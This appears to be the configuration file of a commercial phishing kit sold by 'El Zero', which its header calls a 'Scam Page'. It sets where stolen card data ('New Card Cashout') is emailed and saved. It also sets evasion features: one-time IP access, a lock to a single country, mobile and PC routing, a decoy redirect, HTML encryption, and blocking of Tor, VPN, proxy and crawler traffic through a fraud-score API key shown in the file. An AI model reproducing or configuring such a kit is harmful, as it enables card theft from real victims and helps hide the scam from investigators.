<?php 
/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  ElZero
telegram => @ElZero_Coderr
Site => elzeroSite.com <SOON> 
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/

/*  Send Result To Email */
$sendToEmail = "true";   // if you don't want to send result to email change from true to false
$yourEmail ="yousserjoe1023@yandex.com";
/* Save Result in Text  */
$saveInText = "true";  //true Or false
$textName = "ElZero";  // Text To Save Result  https://link.com/ElZero.txt
/* Notify To Email */

$sendNotify = "true";
$message = "New Card Cashout";
$emailNotify ="youssefjoe1023@yandex.com";

/*access one time ip */
$accessOneTimeIP = "true";    //True / false
$linkBlockedIP = "https://bellycompass.com/";

/*Check mobile or pc*/

$CheckMob = "true";
$linkPC = "https://bellycompass.com/";





/* Redirect El Zero */
$redirect = "false";   // If You Use Redirect El Zero 
$redirectFrom = "facebook.com";  // Domain where you upload Redirect
/*  Trick About Send */
$emailSender = "false";   // Should Send as This https://link.com?email=elzer@example.com 
$accessOneTime = "false";  // If You WAnt User Go Scam Page One Time Only Should Use Email Sender 
$listSent = "false";   //  Should Send as This https://link.com?email=elzer@example.com   And Put Your list in (priv/emailList.txt)
/*   Country Lock  */
$countryBlcok = "true";  // If You Want To Access CCountry You Choose To Go Scam Page 
$allowdCountry = "eg";  // Choose Country
/*  Free Api  */
$blockProxy = "true"; 				// If you don`t want to Block Proxy false to true
/* Encryot HTML */
$encrypt_html = "true"; 				// If you don`t want to encrypt pages hange from true to false
/*	More Protection by using api With Serial */
$ip_protection_api = "lKTxR563Z6WNrKsTaawaKPzMpS12lkhQ"; // Dont touch :()
$ip_protection = "true"; 			     // If you don`t want to use IP Protection change true to false
$max_fraud_score = "75";			// Put max fraud score 
$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to false
$fuck_vpn = "true";					// If you don`t want to disallow VPN Users change true to false
$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to false
/* Pages */
